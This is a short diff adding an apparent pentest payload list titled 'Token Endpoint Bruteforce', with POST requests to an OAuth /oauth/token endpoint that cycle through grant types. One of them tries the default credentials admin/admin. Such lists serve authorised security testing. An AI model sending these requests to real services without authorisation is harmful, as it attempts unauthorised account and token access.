@@ -1,0 +1,8 @@
+# ---- Token Endpoint Bruteforce ----
+POST /oauth/token
+# Try with different grant_types:
+grant_type=client_credentials
+grant_type=password&username=admin&password=admin
+grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=TOKEN
+grant_type=urn:ietf:params:oauth:grant-type:saml2-bearer&assertion=SAML
+grant_type=device_code&device_code=CODE
